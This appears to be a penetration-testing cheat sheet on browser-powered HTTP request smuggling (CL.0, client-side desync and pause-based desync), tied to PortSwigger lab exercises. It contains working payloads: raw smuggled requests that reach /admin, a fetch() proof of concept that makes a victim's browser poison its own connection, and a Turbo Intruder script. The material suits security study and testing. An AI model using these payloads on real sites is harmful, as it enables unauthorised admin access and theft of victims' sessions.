# HTTP request smuggling — Browser-powered (CL.0, client-side desync, pause-based)

Smuggling without malformed requests: using a perfectly normal `Content-Length`, desync a single server (CL.0) or make a **victim's own browser** poison its connection (client-side desync). This breaks the "needs two servers" assumption and lets you attack sites you can't reach directly. Impact: reach `/admin` on single-server sites, and client-side ATO/cache-poisoning delivered via a malicious web page.

## Quick reference

```
# CL.0 probe (server IGNORES Content-Length on some endpoints, e.g. static files / redirects)
# Burp: two tabs in a group, "Send group in sequence (single connection)", Connection: keep-alive
POST /resources/images/blog.svg HTTP/1.1
Host: LAB
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: <correct>

GET /admin HTTP/1.1
Foo: x
# 2nd request in the group returns the smuggled /admin -> CL.0 confirmed

# Client-side desync: browser-issued (normal CL), victim poisons own connection.
# Probe: POST / with CL>0 but EMPTY body -> server responds immediately = ignores CL.
# PoC in real browser via fetch(..., {mode:'no-cors', body:'GET /hopefully404...'} )

# Pause-based desync (Apache server-level redirects): Turbo Intruder, pause 61s after \r\n\r\n
```
Decision list: single server / no classic desync → test **CL.0** on static/redirect endpoints. Want to attack victims through a web page → **client-side desync** (browser fetch). Apache + server-level redirect → **pause-based** desync via Turbo Intruder.

## Root cause
Servers that **ignore the `Content-Length`** of certain requests (static files, server-level redirects, some endpoints) treat the body as a new request — "CL.0". Because the request itself is well-formed (normal CL), a **browser** can send it, so a victim visiting an attacker page can be made to desync their **own** connection to the target (client-side desync). Pause-based variants exploit timing in how a server flushes a redirect before reading the body.

## Find it
- **CL.0:** pick endpoints likely to ignore the body — static resources (`/resources/...svg`), redirects, error pages. In Burp, group two requests, **Send group in sequence (single connection)**, `Connection: keep-alive`. If the 2nd response matches your smuggled prefix (e.g. 404 / `/admin`), the endpoint ignores CL → CL.0.
- **Client-side desync:** send `POST /` with `Content-Length: 1+` but an **empty body**; if the server responds **immediately** (doesn't wait for the body), it's ignoring CL → desyncable from a browser.
- **Pause-based:** check `Server:` header (e.g. Apache 2.4.52) and endpoints that do server-level redirects without trailing slash (`GET /resources` → `/resources/`).

## Technique
**CL.0:** the BE ignores `Content-Length` (treats body as a new request) while the FE still honors it. Smuggle `GET /admin` as the body of a POST to a CL-ignoring endpoint; the 2nd request on the connection is served the smuggled `/admin`. Exploit directly in Repeater (single-connection group). Prime candidates: endpoints not expecting POST (static files, server-level redirects).
- **Eliciting CL.0 when no obvious endpoint:** (a) trigger a **server error** whose response doesn't consume the body off the socket and leaves the connection open; (b) send a **GET with an obfuscated `Content-Length`** hidden from the BE but not the FE (same obfuscation tricks as TE.TE in `../Fundamentals-CL-TE-TE-CL/`).
- **H2.0:** the CL.0 analogue under HTTP/2 downgrade — the downgraded request's `Content-Length` is ignored by the BE.

**Client-side desync (CSD):** make the **victim's browser** desync its own connection. Stages: victim visits attacker page → JS sends a POST to the target with an attacker prefix in the body → the prefix stays on the socket after the response (desync) → JS triggers a follow-up down the **poisoned** connection → harmful response. Works on **single-server** sites. **Target must NOT support HTTP/2** (browsers prefer h2; CSD needs h1 keep-alive reuse) — exception: victim reaches the site via an h1-only forward proxy.
- **Methodical workflow:** probe in Burp → confirm in Burp → browser PoC → find gadget → build exploit in Burp → replicate in browser. (Burp Scanner / HTTP Request Smuggler automate much of it.)
- **Probe:** send a request whose `Content-Length` is **longer than the body**. Hang/timeout = server waits for bytes (safe); **immediate response** = candidate CSD vector. Best candidates: endpoints not expecting POST (static, redirects).
- **Browser-compatible constraint:** a cross-domain browser request only lets you control the **URL, body**, and a few bits (`Referer`, latter part of `Content-Type`). Elicit errors within those: `Referer: https://evil/?%00`, `Content-Type: ...; charset=null, boundary=x`, or path traversal `GET /%2e%2e%2f` (URL-encode — browsers normalize paths).
- **Confirm in Burp:** send **two** requests on one connection; use the first's body to affect the second's response (filters out servers that respond early but still parse the body, or that close the connection).
- **Browser PoC:** non-proxied Chrome, DevTools Network tab (Preserve log + **Connection ID** column). In Console:
  ```js
  fetch('https://VULN/vulnerable-endpoint', {
    method:'POST',
    body:'GET /hopefully404 HTTP/1.1\r\nFoo: x',  // malicious prefix
    mode:'no-cors',           // keeps the connection ID visible
    credentials:'include'     // poisons the with-cookies connection pool
  }).then(()=>{ location='https://VULN/' })   // uses the poisoned connection
  ```
- **Exploits:** client-side variations of classic attacks — steal the victim's own request/response, capture their session, client-side cache poisoning/deception. Handle redirects so the desync isn't lost.

**Pause-based desync:** servers have a **read timeout** — if no more data arrives, they treat the request as complete and respond regardless of `Content-Length`. If the server then **leaves the connection open**, pausing mid-request gives a CL.0-like desync on sites that otherwise look secure.
- **3 conditions:** (1) FE forwards each byte to the BE immediately (doesn't buffer the whole request); (2) FE does **not** time out before the BE; (3) BE **leaves the connection open** after its read-timeout. More likely when the server **generates the response itself** (e.g. a redirect) rather than passing to the app.
- **Mechanism:** send headers (`Content-Length: 34`) but **pause before the body**. FE forwards headers; BE times out and responds (consuming only part); you then send the body (a smuggling prefix); FE treats it as a continuation and forwards it; BE — having already responded — sees it as a **new** request → CL.0 desync.
- **Real-world:** PortSwigger found this on **Apache HTTP Server** doing server-level redirects (`/example` → `/example/`); fixed in **2.4.53** (so a `Server: Apache/2.4.52` banner is a tell).
- **Testing (Turbo Intruder):** Repeater's forwarding of the post-timeout response is unreliable, so use Turbo Intruder (it pauses/resumes regardless of responses):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1,
                           requestsPerConnection=100, pipeline=False)
    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=60000)  # pause 60s after headers
    engine.queue('GET / HTTP/1.1\r\nHost: VULN\r\n\r\n')                  # follow-up
def handleResponse(req, interesting):
    table.add(req)
# Alt: pauseBefore=-34 (offset = inverse of Content-Length) to pause before the body.
# After the pause you see two results; if the 2nd matches the smuggled prefix (404) the desync worked.
```
- **Client-side pause-based (MITM):** browsers can't pause mid-request, but an active **MITM** can delay the final TCP packet (TLS hides content but not packet timing). Pad the first request so the OS splits it into multiple packets with a distinctly-sized final packet; delay that packet until the server responds → desync the browser's connection.

**Advanced / edge:**
- **Client-side variations of classic attacks:** once you have a client-side desync, you can replicate server-side exploits browser-side — **client-side cache poisoning** (poison the victim's own cached resources), **client-side cache deception**, capturing the victim's own requests/credentials, and harvesting their session.
- **H2.0:** the H2.CL/H2.TE family's CL.0 analogue over HTTP/2 downgrade — back-end ignores the body length after downgrade.
- **Connection-state Host-filter bypass:** the same browser-powered research found that on connection-reusing stacks, the **first** request's `Host` is sometimes validated and trusted for **subsequent** requests on that connection — send a valid first request, then reuse the connection with a malicious `Host` to bypass Host-header filtering (overlaps `../../HTTP-Host-header-attacks/`).
- Client-side desync can attack **single-server** sites and **intranet** sites you can't reach directly.

## Payload arsenal
```
# CL.0 exploit (Burp: group of 2, single connection, keep-alive)
POST /resources/images/blog.svg HTTP/1.1
Host: LAB
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: <correct>

GET /admin HTTP/1.1
Foo: x

# Client-side desync PoC (exploit-server HTML)
fetch('https://LAB.h1-web-security-academy.net/', {
  method:'POST', mode:'no-cors', credentials:'include',
  body:'GET /hopefully404 HTTP/1.1\r\nFoo: x'
}).then(()=>{ location='https://LAB.h1-web-security-academy.net/' })

# Pause-based: Turbo Intruder script above (pauseMarker \r\n\r\n, pauseTime 61000)
```

## Bypasses
| Blocker | Bypass |
|---|---|
| only one server (no classic desync) | CL.0 on body-ignoring endpoints |
| can't reach target directly | client-side desync via victim's browser (exploit server) |
| Burp keeps fixing CL | tab settings → disable Update Content-Length |
| redirect kills the desync | "Handling redirects" — keep the connection / adjust prefix |
| timing-sensitive (Apache redirect) | pause-based desync with Turbo Intruder (~61s) |

## Exploitation walkthrough (CL.0 → /admin)
1. Two Repeater tabs in a group. Tab 1 = POST to `/resources/images/blog.svg` with `Connection: keep-alive`, correct CL, body = `GET /admin HTTP/1.1\r\nFoo: x`. Tab 2 = normal `GET /`.
2. Send mode = **Send group in sequence (single connection)**.
3. The 2nd response returns the **/admin** content (the static endpoint ignored your CL, so the body was parsed as the next request). Use it to delete the user / reach admin.

## Chaining
- → [Access-control](../../Access-control/): reach `/admin` on single-server sites.
- → [Authentication](../../Authentication/): client-side desync steals the victim's session.
- → [Web-cache-poisoning](../../Web-cache-poisoning/)/[Web-cache-deception](../../Web-cache-deception/): client-side cache variants.
- Delivered via a malicious page → overlaps [XSS](../../XSS/)/[CSRF](../../CSRF/) delivery.

## Tools
- **Burp Repeater** ("Send group in sequence (single connection)"; disable Update-CL).
- **Turbo Intruder** (pause-based; `pauseMarker`/`pauseTime`).
- **Real Chrome + exploit server** (client-side desync PoC via `fetch`).

## Labs

### CL.0 request smuggling [Practitioner]
URL: .../browser/cl-0/lab-cl-0-request-smuggling — Find a CL-ignoring endpoint (`/resources/...`), smuggle `GET /admin` as the body; send a 2-request group on one connection; 2nd response = admin. Insight: some endpoints ignore the body's Content-Length → single-server smuggling.

### Client-side desync [Expert]
URL: .../browser/client-side-desync/lab-client-side-desync — Confirm `POST /` with CL>0 + empty body returns immediately; build a browser `fetch` PoC on the exploit server that makes the victim poison their own connection; capture their request/session. Insight: well-formed request = browser can send it = victim-side desync.

### Server-side pause-based request smuggling [Expert]
URL: .../browser/pause-based-desync/lab-server-side-pause-based-request-smuggling — Apache server-level redirect; Turbo Intruder POST to `/resources` with `GET /admin/` in body, pause 61s after `\r\n\r\n`; the paused body is read as a new request → admin response. Insight: timing/flush gap turns a redirect endpoint into a CL.0 desync.

Real-target transfer: test CL.0 on every static/redirect endpoint of single-server sites; if a normal-CL empty-body POST returns instantly, try a browser client-side desync. Apache + bare-directory redirects → pause-based.

## Real-world notes
- Browser-powered desync (PortSwigger research) broke the "two servers required" rule — single-server and client-side attacks are now in scope.
- Client-side desync is especially dangerous: delivered via a normal web page, no proxy needed, can hit third-party sites the victim is logged into.
- On live targets, PoC against your own session; client-side desync can affect real users' connections.

## References
- https://portswigger.net/web-security/request-smuggling/browser
